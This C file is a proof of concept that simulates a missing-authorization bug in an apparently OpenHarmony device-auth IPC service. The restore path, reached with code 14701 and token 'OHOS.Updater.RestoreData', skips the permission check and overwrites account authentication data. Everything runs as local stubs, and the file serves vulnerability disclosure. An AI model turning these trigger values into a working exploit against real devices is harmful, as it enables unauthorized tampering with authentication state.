/**
 * PoC: OH-2026-DEVAUTH-RESTORE-001 — CWE-862 Missing Authorization
 *
 * Vulnerability: In ipc_dev_auth_stub.cpp, ServiceDevAuth::OnRemoteRequest
 * has two paths:
 *   1. Normal path (HandleDeviceAuthCall) → calls CheckPermission(methodId)
 *   2. Restore path (HandleRestoreCall) → NO permission check at all
 *
 * The restore path is triggered by:
 *   code == RESTORE_CODE (14701) AND
 *   interfaceToken == "OHOS.Updater.RestoreData"
 *
 * Any process that can send IPC to device_auth with this code+token
 * bypasses ALL permission checks and directly invokes:
 *   ExecuteAccountAuthCmd(osAccountId, UPGRADE_DATA, ...)
 *   ReloadOsAccountDb(osAccountId)
 *
 * File: frameworks/src/standard/ipc_dev_auth_stub.cpp:325-331
 */
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

/* ── Constants from ipc_dev_auth_stub.cpp ── */

#define RESTORE_CODE 14701
#define HC_SUCCESS 0
#define DEFAULT_UPGRADE_OS_ACCOUNT_ID 100

/* ── Simulated permission system ── */

static int permission_check_count = 0;

static int32_t CheckPermission(int32_t methodId) {
    permission_check_count++;
    printf("[AUTH] CheckPermission called for methodId=%d\n", methodId);
    /* In real system, this checks caller UID/token against ACL */
    return -1;  /* DENY — simulating unprivileged caller */
}

/* ── Simulated privileged operations ── */

static int privileged_op_executed = 0;

static int32_t ExecuteAccountAuthCmd(int32_t osAccountId, int cmd, void *a, void *b) {
    (void)cmd; (void)a; (void)b;
    privileged_op_executed++;
    printf("[PRIV] ExecuteAccountAuthCmd(osAccountId=%d, UPGRADE_DATA) — EXECUTED\n", osAccountId);
    printf("[PRIV] This overwrites authentication database for account %d!\n", osAccountId);
    return HC_SUCCESS;
}

static void ReloadOsAccountDb(int32_t osAccountId) {
    privileged_op_executed++;
    printf("[PRIV] ReloadOsAccountDb(osAccountId=%d) — EXECUTED\n", osAccountId);
    printf("[PRIV] Authentication state reloaded — attacker changes now active!\n");
}

/* ── Simulated HandleRestoreCall — no permission check ── */

static int32_t HandleRestoreCall(int32_t osAccountId) {
    /* Note: NO CheckPermission() call here — THE BUG */
    printf("\n[RESTORE PATH] Entered HandleRestoreCall — NO permission check!\n");

    int32_t res = ExecuteAccountAuthCmd(osAccountId, 0, NULL, NULL);
    ReloadOsAccountDb(osAccountId);

    return res;
}

/* ── Simulated HandleDeviceAuthCall — has permission check ── */

static int32_t HandleDeviceAuthCall(int32_t methodId) {
    printf("\n[NORMAL PATH] Entered HandleDeviceAuthCall\n");

    int32_t ret = CheckPermission(methodId);
    if (ret != HC_SUCCESS) {
        printf("[AUTH] Permission DENIED — operation blocked (correct behavior)\n");
        return ret;
    }
    printf("[AUTH] Permission granted\n");
    return HC_SUCCESS;
}

/* ── Simulated OnRemoteRequest dispatcher ── */

static int32_t OnRemoteRequest(uint32_t code, const char *interfaceToken, int32_t osAccountId) {
    /* Check interface token (simplified) */
    bool isRestoreCall = ((code == RESTORE_CODE) &&
                          (strcmp(interfaceToken, "OHOS.Updater.RestoreData") == 0));

    if (!isRestoreCall) {
        /* Normal path — permission is checked */
        return HandleDeviceAuthCall(1);
    } else {
        /* Restore path — BYPASSES CheckPermission entirely */
        return HandleRestoreCall(osAccountId);
    }
}

int main(void)
{
    printf("=== PoC: OH-2026-DEVAUTH-RESTORE-001 (CWE-862) ===\n");
    printf("Demonstrating permission bypass via RESTORE_CODE path\n\n");

    /* Step 1: Normal IPC call — permission check blocks us */
    printf("--- Step 1: Normal IPC request (code=1) ---\n");
    permission_check_count = 0;
    privileged_op_executed = 0;

    int32_t ret = OnRemoteRequest(1, "ohos.security.deviceauth", 0);
    printf("Result: %s (permission checks: %d, privileged ops: %d)\n\n",
           ret == HC_SUCCESS ? "SUCCESS" : "DENIED",
           permission_check_count, privileged_op_executed);

    /* Step 2: Exploit — use RESTORE_CODE to bypass permission */
    printf("--- Step 2: Malicious RESTORE_CODE request (code=14701) ---\n");
    permission_check_count = 0;
    privileged_op_executed = 0;

    ret = OnRemoteRequest(RESTORE_CODE, "OHOS.Updater.RestoreData", 100);
    printf("\nResult: %s (permission checks: %d, privileged ops: %d)\n\n",
           ret == HC_SUCCESS ? "SUCCESS" : "DENIED",
           permission_check_count, privileged_op_executed);

    /* Verify the vulnerability */
    if (permission_check_count == 0 && privileged_op_executed > 0) {
        printf("[VULN] CONFIRMED: RESTORE_CODE path executed privileged operations\n");
        printf("       with ZERO permission checks!\n");
        printf("[VULN] Root cause: OnRemoteRequest dispatches to HandleRestoreCall()\n");
        printf("       which never calls CheckPermission(), unlike HandleDeviceAuthCall().\n");
        printf("[VULN] Impact: Any process that knows code=14701 + token=\"OHOS.Updater.RestoreData\"\n");
        printf("       can execute ExecuteAccountAuthCmd + ReloadOsAccountDb without authorization.\n");
        return 0;
    } else {
        printf("[ERROR] Vulnerability not triggered\n");
        return 1;
    }
}
